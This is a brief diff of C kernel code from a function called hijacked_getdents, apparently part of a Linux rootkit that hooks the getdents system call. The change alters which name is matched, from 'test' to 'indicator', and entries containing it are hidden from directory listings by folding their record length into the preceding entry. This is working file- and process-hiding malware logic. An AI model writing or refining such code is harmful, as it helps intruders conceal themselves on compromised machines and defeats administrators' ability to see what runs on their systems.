@@ -235,7 +235,7 @@ asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 				set_fs(fs);
 				//check process for "test"
 				printk(KERN_INFO "kbuf: %s\n",kbuf);
-				if(strstr(kbuf, "test")!=NULL){
+				if(strstr(kbuf, "indicator")!=NULL){
 					printk("File to hide %s\n", kbuf2);
 					pdirp->d_reclen += cdirp->d_reclen;
 				}
